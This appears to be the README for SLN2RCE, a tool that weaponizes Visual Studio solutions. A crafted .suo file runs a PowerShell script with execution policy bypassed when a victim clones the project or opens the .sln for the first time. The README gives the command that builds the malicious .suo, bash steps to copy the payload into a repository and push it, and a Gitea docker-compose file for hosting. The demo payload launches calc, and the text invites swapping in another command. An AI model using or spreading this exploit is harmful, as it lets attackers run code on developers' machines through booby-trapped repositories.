#########
SLN 2 RCE
#########

| Weaponize Visual Studio project to trigger RCE using SUO file (Solution User Options)
| All credit goes to:
|  https://github.com/cjm00n/EvilSln
|  https://github.com/moom825/visualstudio-suo-exploit

| The RCE happen when cloning project into VS or when opening the sln project file for the first time (VS overwrite the suo file)

|

| The suo file has been made using the following command to overwrite the initial suo file generated by VS

.. code-block:: powershell

    suo_exploit_test.exe .suo test.suo powershell -ep bypass -file action.ps1

|

| action.ps1 will start a calc but you can replace it

.. code-block:: bash

    # Move to a new temp dir
    cd $(mktemp -d)

    # Clone SLN2RCE and your payload project
    git clone https://github.com/charlesgargasson/SLN2RCE.git
    git clone http://localhost:3000/user2/repo.git

    # Copy SLN2RCE to your empty project
    cp -r SLN2RCE/* repo/

    # Set command
    echo 'calc' > repo/action.ps1

    # Push modifications 
    cd repo
    git add *
    git commit -m ok
    git push

|

| If you need a git instance

.. code-block:: bash

    cat <<'EOF'>/tmp/gitea.yml
    version: "3"

    networks:
    gitea:
        external: false

    services:
    server:
        image: gitea/gitea:1.22.3
        container_name: gitea
        environment:
        - USER_UID=1000
        - USER_GID=1000
        restart: always
        networks:
        - gitea
        volumes:
        - /tmp/gitea:/data
        - /etc/timezone:/etc/timezone:ro
        - /etc/localtime:/etc/localtime:ro
        ports:
        - "3000:3000"
        - "222:22"
    EOF

    docker-compose -f /tmp/gitea.yml up

|